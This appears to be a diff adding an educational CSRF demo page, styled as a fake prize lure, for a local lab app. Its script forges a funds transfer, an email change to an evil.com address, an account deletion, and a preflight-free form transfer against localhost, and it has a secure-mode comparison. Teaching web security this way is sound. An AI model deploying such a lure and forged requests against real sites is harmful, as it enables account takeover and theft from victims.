@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>You've Won a Prize! 🎉</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #1a1a2e;
+      color: #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #16213e;
+      border: 2px solid #e74c3c;
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 600px;
+      text-align: center;
+    }
+    h1 { color: #e74c3c; }
+    .attack-log {
+      background: #0a0a1a;
+      border: 1px solid #e74c3c;
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 24px;
+      text-align: left;
+      font-family: monospace;
+      font-size: 13px;
+    }
+    .success { color: #e74c3c; }
+    .info    { color: #f39c12; }
+    .step    { color: #3498db; }
+    button {
+      background: #e74c3c;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>🎉 Congratulations!</h1>
+  <p>You've been selected for a special offer!</p>
+  <p style="color:#aaa; font-size:13px;">
+    (In reality this page is silently forging requests to your app)
+  </p>
+
+  <div class="attack-log" id="log">
+    <p class="info">⚡ CSRF Attack Demo Page</p>
+    <p class="info">This simulates evil.com — a page the victim visits while logged in.</p>
+    <p class="step">Click "Launch Attack" to fire forged requests...</p>
+  </div>
+
+  <button onclick="launchAttack()">🚀 Launch CSRF Attack</button>
+</div>
+
+<script>
+  const TARGET = 'http://localhost:5000/api';
+  const log    = document.getElementById('log');
+
+  function addLog(msg, type = 'info') {
+    const p = document.createElement('p');
+    p.className = type;
+    p.textContent = msg;
+    log.appendChild(p);
+  }
+
+  async function launchAttack() {
+    addLog('--- Attack Started ---', 'step');
+    addLog('🎯 Target: http://localhost:5000/api/user/transfer', 'info');
+    addLog('👤 No JWT sent — in cookie-based auth this would work automatically', 'info');
+
+    // ── Attack 1: Forged Transfer ──────────────────────────
+    addLog('[Attack 1] Forging transfer request...', 'step');
+    try {
+      const res = await fetch(`${TARGET}/user/transfer`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ amount: 9999, toAccount: 'ATTACKER_ACCT_001' }),
+      });
+      const data = await res.json();
+
+      if (res.ok) {
+        addLog(`✅ ATTACK SUCCEEDED: ${data.message}`, 'success');
+        addLog(`   Mode: ${data.mode}`, 'info');
+        if (data.warning) addLog(`   ${data.warning}`, 'success');
+      } else {
+        addLog(`🔒 ATTACK BLOCKED: ${data.error}`, 'step');
+      }
+    } catch (err) {
+      addLog(`❌ Network error: ${err.message} — check CORS fix in server.js`, 'info');
+    }
+
+    // ── Attack 2: Forged Email Change ──────────────────────
+    addLog('[Attack 2] Forging email change...', 'step');
+    try {
+      const res = await fetch(`${TARGET}/user/change-email`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ newEmail: 'attacker-controlled@evil.com' }),
+      });
+      const data = await res.json();
+
+      if (res.ok) {
+        addLog(`✅ EMAIL HIJACK SUCCEEDED: ${data.message}`, 'success');
+        addLog('   Attacker triggers password reset → full account takeover', 'success');
+      } else {
+        addLog(`🔒 ATTACK BLOCKED: ${data.error}`, 'step');
+      }
+    } catch (err) {
+      addLog(`❌ Network error: ${err.message}`, 'info');
+    }
+
+    // ── Attack 3: Forged Delete ────────────────────────────
+    addLog('[Attack 3] Forging account deletion...', 'step');
+    try {
+      const res = await fetch(`${TARGET}/user/delete-account`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({}),
+      });
+      const data = await res.json();
+
+      if (res.ok) {
+        addLog(`✅ ACCOUNT DELETED: ${data.message}`, 'success');
+      } else {
+        addLog(`🔒 ATTACK BLOCKED: ${data.error}`, 'step');
+      }
+    } catch (err) {
+      addLog(`❌ Network error: ${err.message}`, 'info');
+    }
+
+    // ── Attack 4: Traditional hidden form (no preflight) ───
+    addLog('[Attack 4] Hidden form submission...', 'step');
+    try {
+      // Use URLSearchParams — sends as application/x-www-form-urlencoded
+      // This is a "simple request" — NO preflight, browser sends it immediately
+      // This is the classic CSRF vector that bypasses CORS preflight entirely
+      const formData = new URLSearchParams();
+      formData.append('amount', '5000');
+      formData.append('toAccount', 'ATTACKER_ACCT_002');
+
+      const res = await fetch(`${TARGET}/user/transfer`, {
+        method: 'POST',
+        body:   formData,  // no Content-Type: application/json header
+      });
+
+      // Server might reject this since it expects JSON
+      // but the REQUEST was sent — no preflight blocked it
+      addLog('✅ Form request SENT without preflight (simple request)', 'success');
+      addLog('   Real CSRF via HTML forms bypasses CORS entirely', 'info');
+      addLog('   This is why SameSite cookies + CSRF tokens are both needed', 'info');
+    } catch (err) {
+      addLog(`Network: ${err.message}`, 'info');
+    }
+
+    addLog('--- Attack Sequence Complete ---', 'step');
+    addLog('Now switch to SECURE MODE and click again to see all attacks blocked.', 'info');
+  }
+
+  window.onload = () => {
+    addLog('👁️  Page loaded. In a real attack these would fire automatically.', 'info');
+    addLog('   Victim sees the prize page, attacks run silently in background.', 'info');
+    addLog('   Click Launch Attack to begin the demo.', 'step');
+  };
+</script>
+
+</body>
+</html>
